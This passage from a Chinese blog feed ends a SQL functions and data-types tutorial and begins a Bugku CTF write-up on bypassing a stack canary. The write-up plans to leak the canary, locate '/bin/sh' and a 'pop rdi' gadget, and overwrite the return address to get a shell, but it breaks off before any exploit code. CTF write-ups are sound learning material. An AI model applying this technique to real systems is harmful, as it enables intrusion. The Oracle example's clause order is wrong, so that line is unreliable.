<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> table_name <span class="keyword">order</span> <span class="keyword">by</span> column_name <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure></div>

<p>3、mysql 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> table_name <span class="keyword">order</span> <span class="keyword">by</span> column_name <span class="keyword">desc</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>4、oracle 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> table_name <span class="keyword">order</span> <span class="keyword">by</span> column_name <span class="keyword">desc</span> <span class="keyword">where</span> rownum <span class="operator">&lt;=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="7、max"><a href="#7、max" class="headerlink" title="7、max()"></a>7、max()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数返回指定列的最大值。</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<h3 id="8、min"><a href="#8、min" class="headerlink" title="8、min()"></a>8、min()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数返回指定列的最小值</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<h3 id="9、sum"><a href="#9、sum" class="headerlink" title="9、sum()"></a>9、sum()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数返回数值列的总数。</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<h3 id="10、ucase"><a href="#10、ucase" class="headerlink" title="10、ucase()"></a>10、ucase()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数把字段的值转换为大写。</span><br></pre></td></tr></table></figure></div>

<p>1、sql ucase() 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ucase(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<p>2、用于 sql server 的语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">upper</span>(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<h3 id="11、lcase"><a href="#11、lcase" class="headerlink" title="11、lcase()"></a>11、lcase()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数把字段的值转换为小写。</span><br></pre></td></tr></table></figure></div>

<p>1、sql lcase() 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lcase(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<p>2、用于 sql server 的语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">lower</span>(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<h3 id="12、mid"><a href="#12、mid" class="headerlink" title="12、mid()"></a>12、mid()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数用于从文本字段中提取字符。</span><br></pre></td></tr></table></figure></div>

<p>sql mid() 语法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select mid(column_name,start[,length]) from table_name;</span><br></pre></td></tr></table></figure></div>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>column_name</td>
<td>必需。要提取字符的字段。</td>
</tr>
<tr>
<td>start</td>
<td>必需。规定开始位置（起始值是 1）。</td>
</tr>
<tr>
<td>length</td>
<td>可选。要返回的字符数。如果省略，则 mid() 函数返回剩余文本。</td>
</tr>
</tbody></table>
<h3 id="13、len"><a href="#13、len" class="headerlink" title="13、len()"></a>13、len()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数返回文本字段中值的长度。</span><br></pre></td></tr></table></figure></div>

<p>1、sql len() 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> len(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<p>2、mysql 中函数为 length():</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> length(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<h3 id="14、round"><a href="#14、round" class="headerlink" title="14、round()"></a>14、round()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数用于把数值字段舍入为指定的小数位数。</span><br></pre></td></tr></table></figure></div>

<p>sql round() 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> round(column_name,decimals) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>column_name</td>
<td>必需。要舍入的字段。</td>
</tr>
<tr>
<td>decimals</td>
<td>可选。规定要返回的小数位数。</td>
</tr>
</tbody></table>
<h3 id="15、now"><a href="#15、now" class="headerlink" title="15、now()"></a>15、now()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数返回当前系统的日期和时间。</span><br></pre></td></tr></table></figure></div>

<p>sql now() 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> now() <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<p>16、format() </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数用于对字段的显示进行格式化。</span><br></pre></td></tr></table></figure></div>

<p>sql format() 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> format(column_name,format) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>column_name</td>
<td>必需。要格式化的字段。</td>
</tr>
<tr>
<td>format</td>
<td>必需。规定格式。</td>
</tr>
</tbody></table>
<h2 id="十六、数据类型"><a href="#十六、数据类型" class="headerlink" title="十六、数据类型"></a>十六、数据类型</h2><h3 id="1、sql-通用数据类型"><a href="#1、sql-通用数据类型" class="headerlink" title="1、sql 通用数据类型"></a>1、sql 通用数据类型</h3><p>数据库表中的每个列都要求有名称和数据类型。each column in a database table is required to have a name and a data type.</p>
<p>sql 开发人员必须在创建 sql 表时决定表中的每个列将要存储的数据的类型。数据类型是一个标签，是便于 sql 了解每个列期望存储什么类型的数据的指南，它也标识了 sql 如何与存储的数据进行交互。</p>
<p>下面的表格列出了 sql 中通用的数据类型：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>character(n)</td>
<td>字符&#x2F;字符串。固定长度 n。</td>
</tr>
<tr>
<td>varchar(n)  或   character varying(n)</td>
<td>字符&#x2F;字符串。可变长度。最大长度 n。</td>
</tr>
<tr>
<td>binary(n)</td>
<td>二进制串。固定长度 n。</td>
</tr>
<tr>
<td>boolean</td>
<td>存储 true 或 false 值</td>
</tr>
<tr>
<td>varbinary(n)  或   binary varying(n)</td>
<td>二进制串。可变长度。最大长度 n。</td>
</tr>
<tr>
<td>integer(p)</td>
<td>整数值（没有小数点）。精度 p。</td>
</tr>
<tr>
<td>smallint</td>
<td>整数值（没有小数点）。精度 5。</td>
</tr>
<tr>
<td>integer</td>
<td>整数值（没有小数点）。精度 10。</td>
</tr>
<tr>
<td>bigint</td>
<td>整数值（没有小数点）。精度 19。</td>
</tr>
<tr>
<td>decimal(p,s)</td>
<td>精确数值，精度 p，小数点后位数 s。例如：decimal(5,2) 是一个小数点前有 3 位数，小数点后有 2 位数的数字。</td>
</tr>
<tr>
<td>numeric(p,s)</td>
<td>精确数值，精度 p，小数点后位数 s。（与 decimal 相同）</td>
</tr>
<tr>
<td>float(p)</td>
<td>近似数值，尾数精度 p。一个采用以 10 为基数的指数计数法的浮点数。该类型的 size 参数由一个指定最小精度的单一数字组成。</td>
</tr>
<tr>
<td>real</td>
<td>近似数值，尾数精度 7。</td>
</tr>
<tr>
<td>float</td>
<td>近似数值，尾数精度 16。</td>
</tr>
<tr>
<td>double  precision</td>
<td>近似数值，尾数精度 16。</td>
</tr>
<tr>
<td>date</td>
<td>存储年、月、日的值。</td>
</tr>
<tr>
<td>time</td>
<td>存储小时、分、秒的值。</td>
</tr>
<tr>
<td>timestamp</td>
<td>存储年、月、日、小时、分、秒的值。</td>
</tr>
<tr>
<td>interval</td>
<td>由一些整数字段组成，代表一段时间，取决于区间的类型。</td>
</tr>
<tr>
<td>array</td>
<td>元素的固定长度的有序集合</td>
</tr>
<tr>
<td>multiset</td>
<td>元素的可变长度的无序集合</td>
</tr>
<tr>
<td>xml</td>
<td>存储 xml 数据</td>
</tr>
</tbody></table>
<h3 id="2、sql-数据类型快速参考手册"><a href="#2、sql-数据类型快速参考手册" class="headerlink" title="2、sql 数据类型快速参考手册"></a><strong>2、sql 数据类型快速参考手册</strong></h3><p>然而，不同的数据库对数据类型定义提供不同的选择。</p>
<p>下面的表格显示了各种不同的数据库平台上一些数据类型的通用名称：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>access</th>
<th>sqlserver</th>
<th>oracle</th>
<th>mysql</th>
<th>postgresql</th>
</tr>
</thead>
<tbody><tr>
<td>boolean</td>
<td>yes&#x2F;no</td>
<td>bit</td>
<td>byte</td>
<td>n&#x2F;a</td>
<td>boolean</td>
</tr>
<tr>
<td>integer</td>
<td>number  (integer)</td>
<td>int</td>
<td>number</td>
<td>int   integer</td>
<td>int   integer</td>
</tr>
<tr>
<td>float</td>
<td>number  (single)</td>
<td>float   real</td>
<td>number</td>
<td>float</td>
<td>numeric</td>
</tr>
<tr>
<td>currency</td>
<td>currency</td>
<td>money</td>
<td>n&#x2F;a</td>
<td>n&#x2F;a</td>
<td>money</td>
</tr>
<tr>
<td>string  (fixed)</td>
<td>n&#x2F;a</td>
<td>char</td>
<td>char</td>
<td>char</td>
<td>char</td>
</tr>
<tr>
<td>string  (variable)</td>
<td>text  (&lt;256)   memo (65k+)</td>
<td>varchar</td>
<td>varchar   varchar2</td>
<td>varchar</td>
<td>varchar</td>
</tr>
<tr>
<td>binary  object</td>
<td>ole  object memo</td>
<td>binary  (fixed up to 8k)   varbinary (&lt;8k)   image (&lt;2gb)</td>
<td>long   raw</td>
<td>blob   text</td>
<td>binary   varbinary</td>
</tr>
</tbody></table>
<h3 id="3、microsoft-access"><a href="#3、microsoft-access" class="headerlink" title="3、microsoft access"></a><strong>3、microsoft access</strong></h3><table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
<th>存储</th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>用于文本或文本与数字的组合。最多 255 个字符。</td>
<td></td>
</tr>
<tr>
<td>memo</td>
<td>memo  用于更大数量的文本。最多存储 65,536 个字符。注释：无法对 memo 字段进行排序。不过它们是可搜索的。</td>
<td></td>
</tr>
<tr>
<td>byte</td>
<td>允许 0 到 255 的数字。</td>
<td>1  字节</td>
</tr>
<tr>
<td>integer</td>
<td>允许介于 -32,768 与 32,767 之间的全部数字。</td>
<td>2  字节</td>
</tr>
<tr>
<td>long</td>
<td>允许介于 -2,147,483,648 与 2,147,483,647 之间的全部数字。</td>
<td>4  字节</td>
</tr>
<tr>
<td>single</td>
<td>单精度浮点。处理大多数小数。</td>
<td>4  字节</td>
</tr>
<tr>
<td>double</td>
<td>双精度浮点。处理大多数小数。</td>
<td>8  字节</td>
</tr>
<tr>
<td>currency</td>
<td>用于货币。支持 15 位的元，外加 4 位小数。提示：您可以选择使用哪个国家的货币。</td>
<td>8  字节</td>
</tr>
<tr>
<td>autonumber</td>
<td>autonumber  字段自动为每条记录分配数字，通常从 1 开始。</td>
<td>4  字节</td>
</tr>
<tr>
<td>date&#x2F;time</td>
<td>用于日期和时间</td>
<td>8  字节</td>
</tr>
<tr>
<td>yes&#x2F;no</td>
<td>逻辑字段，可以显示为 yes&#x2F;no、true&#x2F;false 或 on&#x2F;off。在代码中，使用常量 true 和 false （等价于 1 和 0）。注释：yes&#x2F;no 字段中不允许 null 值</td>
<td>1  比特</td>
</tr>
<tr>
<td>ole  object</td>
<td>可以存储图片、音频、视频或其他 blobs（binary large objects）。</td>
<td>最多 1gb</td>
</tr>
<tr>
<td>hyperlink</td>
<td>包含指向其他文件的链接，包括网页。</td>
<td></td>
</tr>
<tr>
<td>lookup  wizard</td>
<td>允许您创建一个可从下拉列表中进行选择的选项列表。</td>
<td>4  字节</td>
</tr>
</tbody></table>
<h3 id="4、mysql"><a href="#4、mysql" class="headerlink" title="4、mysql"></a><strong>4、mysql</strong></h3><p>在 mysql 中，有三种主要的类型：text（文本）、number（数字）和 date&#x2F;time（日期&#x2F;时间）类型。</p>
<h5 id="1、text："><a href="#1、text：" class="headerlink" title="1、text："></a>1、text：</h5><table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>char(size)</td>
<td>保存固定长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的长度。最多 255 个字符。</td>
</tr>
<tr>
<td>varchar(size)</td>
<td>保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。注释：如果值的长度大于 255，则被转换为 text 类型。</td>
</tr>
<tr>
<td>tinytext</td>
<td>存放最大长度为 255 个字符的字符串。</td>
</tr>
<tr>
<td>text</td>
<td>存放最大长度为 65,535 个字符的字符串。</td>
</tr>
<tr>
<td>blob</td>
<td>用于 blobs（binary large objects）。存放最多 65,535 字节的数据。</td>
</tr>
<tr>
<td>mediumtext</td>
<td>存放最大长度为 16,777,215 个字符的字符串。</td>
</tr>
<tr>
<td>mediumblob</td>
<td>用于 blobs（binary large objects）。存放最多 16,777,215 字节的数据。</td>
</tr>
<tr>
<td>longtext</td>
<td>存放最大长度为 4,294,967,295 个字符的字符串。</td>
</tr>
<tr>
<td>longblob</td>
<td>用于 blobs (binary large objects)。存放最多 4,294,967,295 字节的数据。</td>
</tr>
<tr>
<td>enum(x,y,z,etc.)</td>
<td>允许您输入可能值的列表。可以在 enum 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。  注释：这些值是按照您输入的顺序排序的。  可以按照此格式输入可能的值： enum(‘x’,’y’,’z’)</td>
</tr>
<tr>
<td>set</td>
<td>与 enum 类似，不同的是，set 最多只能包含 64 个列表项且 set 可存储一个以上的选择。</td>
</tr>
</tbody></table>
<h5 id="2、number："><a href="#2、number：" class="headerlink" title="2、number："></a>2、number：</h5><table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>tinyint(size)</td>
<td>带符号-128到127 ，无符号0到255。</td>
</tr>
<tr>
<td>smallint(size)</td>
<td>带符号范围-32768到32767，无符号0到65535, size 默认为 6。</td>
</tr>
<tr>
<td>mediumint(size)</td>
<td>带符号范围-8388608到8388607，无符号的范围是0到16777215。 size 默认为9</td>
</tr>
<tr>
<td>int(size)</td>
<td>带符号范围-2147483648到2147483647，无符号的范围是0到4294967295。 size 默认为 11</td>
</tr>
<tr>
<td>bigint(size)</td>
<td>带符号的范围是-9223372036854775808到9223372036854775807，无符号的范围是0到18446744073709551615。size 默认为 20</td>
</tr>
<tr>
<td>float(size,d)</td>
<td>带有浮动小数点的小数字。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td>double(size,d)</td>
<td>带有浮动小数点的大数字。在 size 参数中规显示定最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
<tr>
<td>decimal(size,d)</td>
<td>作为字符串存储的 double 类型，允许固定的小数点。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。</td>
</tr>
</tbody></table>
<p>注意：以上的 size 代表的并不是存储在数据库中的具体的长度，如 int(4) 并不是只能存储4个长度的数字。</p>
<p>实际上int(size)所占多少存储空间并无任何关系。int(3)、int(4)、int(8) 在磁盘上都是占用 4 btyes 的存储空间。就是在显示给用户的方式有点不同外，int(m) 跟 int 数据类型是相同的。</p>
<p>例如：</p>
<p>1、int的值为10 （指定zerofill）</p>
<p>int（9）显示结果为000000010int（3）显示结果为010</p>
<p>就是显示的长度不一样而已 都是占用四个字节的空间</p>
<h5 id="3、date："><a href="#3、date：" class="headerlink" title="3、date："></a>3、date：</h5><table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>date()</td>
<td>日期。格式：yyyy-mm-dd  注释：支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’</td>
</tr>
<tr>
<td>datetime()</td>
<td>*日期和时间的组合。格式：yyyy-mm-dd hh:mm:ss  注释：支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31  23:59:59’</td>
</tr>
<tr>
<td>timestamp()</td>
<td>*时间戳。timestamp 值使用 unix 纪元(‘1970-01-01  00:00:00’ utc) 至今的秒数来存储。格式：yyyy-mm-dd hh:mm:ss  注释：支持的范围是从 ‘1970-01-01 00:00:01’ utc 到 ‘2038-01-09  03:14:07’ utc</td>
</tr>
<tr>
<td>time()</td>
<td>时间。格式：hh:mm:ss  注释：支持的范围是从 ‘-838:59:59’ 到 ‘838:59:59’</td>
</tr>
<tr>
<td>year()</td>
<td>2  位或 4 位格式的年。  注释：4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。</td>
</tr>
</tbody></table>
<p>*即便 datetime 和 timestamp 返回相同的格式，它们的工作方式很不同。在 insert 或 update 查询中，timestamp 自动把自身设置为当前的日期和时间。timestamp 也接受不同的格式，比如 yyyymmddhhmmss、yymmddhhmmss、yyyymmdd 或 yymmdd。</p>
<h3 id="5、sql-server"><a href="#5、sql-server" class="headerlink" title="5、sql server"></a>5、sql server</h3><h4 id="1、string："><a href="#1、string：" class="headerlink" title="1、string："></a>1、string：</h4><table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
<th>存储</th>
</tr>
</thead>
<tbody><tr>
<td>char(n)</td>
<td>固定长度的字符串。最多 8,000 个字符。</td>
<td>defined  width</td>
</tr>
<tr>
<td>varchar(n)</td>
<td>可变长度的字符串。最多 8,000 个字符。</td>
<td>2  bytes + number of chars</td>
</tr>
<tr>
<td>varchar(max)</td>
<td>可变长度的字符串。最多 1,073,741,824 个字符。</td>
<td>2  bytes + number of chars</td>
</tr>
<tr>
<td>text</td>
<td>可变长度的字符串。最多 2gb 文本数据。</td>
<td>4  bytes + number of chars</td>
</tr>
<tr>
<td>nchar</td>
<td>固定长度的 unicode 字符串。最多 4,000 个字符。</td>
<td>defined  width x 2</td>
</tr>
<tr>
<td>nvarchar</td>
<td>可变长度的 unicode 字符串。最多 4,000 个字符。</td>
<td></td>
</tr>
<tr>
<td>nvarchar(max)</td>
<td>可变长度的 unicode 字符串。最多 536,870,912 个字符。</td>
<td></td>
</tr>
<tr>
<td>ntext</td>
<td>可变长度的 unicode 字符串。最多 2gb 文本数据。</td>
<td></td>
</tr>
<tr>
<td>bit</td>
<td>允许 0、1 或 null</td>
<td></td>
</tr>
<tr>
<td>binary(n)</td>
<td>固定长度的二进制字符串。最多 8,000 字节。</td>
<td></td>
</tr>
<tr>
<td>varbinary</td>
<td>可变长度的二进制字符串。最多 8,000 字节。</td>
<td></td>
</tr>
<tr>
<td>varbinary(max)</td>
<td>可变长度的二进制字符串。最多 2gb。</td>
<td></td>
</tr>
<tr>
<td>image</td>
<td>可变长度的二进制字符串。最多 2gb。</td>
<td></td>
</tr>
</tbody></table>
<h4 id="2、number：-1"><a href="#2、number：-1" class="headerlink" title="2、number："></a>2、number：</h4><table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
<th>存储</th>
</tr>
</thead>
<tbody><tr>
<td>tinyint</td>
<td>允许从 0 到 255 的所有数字。</td>
<td>1  字节</td>
</tr>
<tr>
<td>smallint</td>
<td>允许介于 -32,768 与 32,767 的所有数字。</td>
<td>2  字节</td>
</tr>
<tr>
<td>int</td>
<td>允许介于 -2,147,483,648 与 2,147,483,647 的所有数字。</td>
<td>4  字节</td>
</tr>
<tr>
<td>bigint</td>
<td>允许介于 -9,223,372,036,854,775,808 与  9,223,372,036,854,775,807 之间的所有数字。</td>
<td>8  字节</td>
</tr>
<tr>
<td>decimal(p,s)</td>
<td>固定精度和比例的数字。  允许从 -10^38 +1 到 10^38 -1 之间的数字。  p  参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。  s  参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</td>
<td>5-17  字节</td>
</tr>
<tr>
<td>numeric(p,s)</td>
<td>固定精度和比例的数字。  允许从 -10^38 +1 到 10^38 -1 之间的数字。  p  参数指示可以存储的最大位数（小数点左侧和右侧）。p 必须是 1 到 38 之间的值。默认是 18。  s  参数指示小数点右侧存储的最大位数。s 必须是 0 到 p 之间的值。默认是 0。</td>
<td>5-17  字节</td>
</tr>
<tr>
<td>smallmoney</td>
<td>介于 -214,748.3648 与 214,748.3647 之间的货币数据。</td>
<td>4  字节</td>
</tr>
<tr>
<td>money</td>
<td>介于 -922,337,203,685,477.5808 与  922,337,203,685,477.5807 之间的货币数据。</td>
<td>8  字节</td>
</tr>
<tr>
<td>float(n)</td>
<td>从 -1.79e + 308 到 1.79e + 308 的浮动精度数字数据。  n  参数指示该字段保存 4 字节还是 8 字节。float(24) 保存 4 字节，而 float(53) 保存 8 字节。n 的默认值是 53。</td>
<td>4  或 8 字节</td>
</tr>
<tr>
<td>real</td>
<td>从 -3.40e + 38 到 3.40e + 38 的浮动精度数字数据。</td>
<td>4  字节</td>
</tr>
</tbody></table>
<h4 id="3、date：-1"><a href="#3、date：-1" class="headerlink" title="3、date："></a>3、date：</h4><table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
<th>存储</th>
</tr>
</thead>
<tbody><tr>
<td>datetime</td>
<td>从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 3.33 毫秒。</td>
<td>8  字节</td>
</tr>
<tr>
<td>datetime2</td>
<td>从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 100 纳秒。</td>
<td>6-8  字节</td>
</tr>
<tr>
<td>smalldatetime</td>
<td>从 1900 年 1 月 1 日 到 2079 年 6 月 6 日，精度为 1 分钟。</td>
<td>4  字节</td>
</tr>
<tr>
<td>date</td>
<td>仅存储日期。从 0001 年 1 月 1 日 到 9999 年 12 月 31 日。</td>
<td>3  bytes</td>
</tr>
<tr>
<td>time</td>
<td>仅存储时间。精度为 100 纳秒。</td>
<td>3-5  字节</td>
</tr>
<tr>
<td>datetimeoffset</td>
<td>与 datetime2 相同，外加时区偏移。</td>
<td>8-10  字节</td>
</tr>
<tr>
<td>timestamp</td>
<td>存储唯一的数字，每当创建或修改某行时，该数字会更新。timestamp 值基于内部时钟，不对应真实时间。每个表只能有一个 timestamp 变量。</td>
<td></td>
</tr>
</tbody></table>
<h4 id="4、其他数据类型："><a href="#4、其他数据类型：" class="headerlink" title="4、其他数据类型："></a>4、其他数据类型：</h4><table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>sql_variant</td>
<td>存储最多 8,000 字节不同数据类型的数据，除了 text、ntext 以及 timestamp。</td>
</tr>
<tr>
<td>uniqueidentifier</td>
<td>存储全局唯一标识符 (guid)。</td>
</tr>
<tr>
<td>xml</td>
<td>存储 xml 格式化数据。最多 2gb。</td>
</tr>
<tr>
<td>cursor</td>
<td>存储对用于数据库操作的指针的引用。</td>
</tr>
<tr>
<td>table</td>
<td>存储结果集，供稍后处理。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>数据库</tag>
        <tag>MariaDB</tag>
        <tag>Mysql</tag>
        <tag>关系型数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>[Bugku]canary</title>
    <url>/2022/02/06/bugkucanary/</url>
    <content><![CDATA[<h2 id="查看程序保护机制"><a href="#查看程序保护机制" class="headerlink" title="查看程序保护机制"></a>查看程序保护机制</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/image-20220218164122140.png"
                      alt="image-20220218164122140"
                ></p>
<p>发现打开了NX、Canary,结合本题题目可知本题主要是进行canary绕过</p>
<h2 id="分析程序流程"><a href="#分析程序流程" class="headerlink" title="分析程序流程"></a>分析程序流程</h2><h3 id="首先运行一下程序"><a href="#首先运行一下程序" class="headerlink" title="首先运行一下程序"></a>首先运行一下程序</h3><p>输入<code>chmod +x pwn4</code>赋予pwn4执行的权限,然后<code>./pwn4</code>运行:</p>
<p>提示输入名字(36个字符以内),继续</p>
<p>提示输入一段message,继续</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/image-20220218164839317.png"
                      alt="image-20220218164839317"
                ></p>
<p>程序结束</p>
<h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>接下来使用<code>objdump -d pwn4</code>命令进行反汇编,寻找段名找有意义的函数,找到了main函数和一个hint函数(提示函数?)</p>
<h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p>观察main函数发现canary保护</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/image-20220218171700158.png"
                      alt="image-20220218171700158"
                ></p>
<p>main函数的栈帧如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/image-20220218172405955.png"
                      alt="image-20220218172405955"
                ></p>
<p>输入的name一共占用0x240-0x210共48个字节,message占用0x240-0x8共520个字节,canary占用8个字节,两次输入均可输入0x300(768)个字节</p>
<h4 id="hint函数"><a href="#hint函数" class="headerlink" title="hint函数"></a>hint函数</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/image-20220218172709308.png"
                      alt="image-20220218172709308"
                ></p>
<p>hint函数调用了system函数,gdb调试看看hint中的system执行了什么命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/image-20220218172906933.png"
                      alt="image-20220218172906933"
                ></p>
<p>hint函数执行了<code>echo sixsixsix</code>命令<code>x/s</code>命令表示以字符串的形式查看内存</p>
<h2 id="pwn思路"><a href="#pwn思路" class="headerlink" title="pwn思路"></a>pwn思路</h2><p>程序共有两次输入,且都允许输入0x300(768)个字节,可以利用第一次输入泄漏出来canary的值</p>
<p>然后构造payload利用第二次输入覆盖掉address获取shell.</p>
<p>现在还有一个问题就是hint函数虽然调用了system但是并没有进行输出flag到操作或者让我们拿到shell,因为程序开启了NX保护,因此没办法在输入变量时构造shellcode,我们查一下看看程序有没有<code>/bin/sh</code>的字串.</p>
<p>通过<code>strings pwn4</code>命令发现目标</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/image-20220218174531839.png"
                      alt="image-20220218174531839"
                ></p>
<p>接下来使用gef的<code>search-pattern /bin/sh</code>命令来查找<code>/bin/sh</code>的地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/image-20220218175008668.png"
                      alt="image-20220218175008668"
                ></p>
<p>在pwn4文件的0x601068发现了该字符串</p>
<p>然后通过将该字符串作为参数传到system函数中即可获取shell</p>
<p>传参可以使用rdi寄存器,我们通过gef的<code>ropper --search &#39;pop rdi&#39;</code>命令搜索一下程序中有没有<code>pop rdi</code>的命令:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
